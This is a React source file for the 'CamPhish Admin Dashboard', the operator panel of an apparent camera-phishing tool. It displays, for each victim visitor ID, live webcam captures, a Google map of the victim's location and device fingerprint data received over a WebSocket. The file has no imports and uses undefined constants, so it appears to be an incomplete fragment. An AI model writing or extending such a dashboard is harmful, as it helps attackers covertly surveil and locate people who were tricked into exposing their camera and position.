// This file is React source code and must be run with react-scripts, not directly by Node.js
// No changes needed here for Node.js environment


function App() {
  const [streams, setStreams] = useState([]); // Array of {id, image, fingerprint}
  const ws = useRef(null);

  useEffect(() => {
    ws.current = new WebSocket(WS_URL);

    ws.current.onmessage = (event) => {
      const data = JSON.parse(event.data);
      // Assuming data contains image (base64) and fingerprint with location
      setStreams(prev => {
        const existingIndex = prev.findIndex(s => s.id === data.fingerprint.visitorId);
        if (existingIndex !== -1) {
          const updated = [...prev];
          updated[existingIndex] = data;
          return updated;
        } else {
          return [...prev, data];
        }
      });
    };

    ws.current.onclose = () => {
      console.log('WebSocket closed');
    };

    return () => {
      ws.current.close();
    };
  }, []);

  return (
    <div style={{ padding: 20 }}>
      <h1>CamPhish Admin Dashboard</h1>
      <div style={{ display: 'flex', flexWrap: 'wrap' }}>
        {streams.map(stream => (
          <div key={stream.fingerprint.visitorId} style={{ margin: 10, border: '1px solid #ccc', padding: 10, width: 320 }}>
            <h3>Visitor ID: {stream.fingerprint.visitorId}</h3>
            <img src={stream.image} alt="Webcam capture" style={{ width: '100%' }} />
            <div>
              <h4>Location:</h4>
              <LoadScript googleMapsApiKey={GOOGLE_MAPS_API_KEY}>
                <GoogleMap
                  mapContainerStyle={{ height: '200px', width: '100%' }}
                  center={{ lat: stream.fingerprint.location.latitude, lng: stream.fingerprint.location.longitude }}
                  zoom={12}
                >
                  <Marker position={{ lat: stream.fingerprint.location.latitude, lng: stream.fingerprint.location.longitude }} />
                </GoogleMap>
              </LoadScript>
            </div>
            <div>
              <h4>Device Info:</h4>
              <pre style={{ whiteSpace: 'pre-wrap', wordWrap: 'break-word' }}>
                {JSON.stringify(stream.fingerprint.device, null, 2)}
              </pre>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default App;
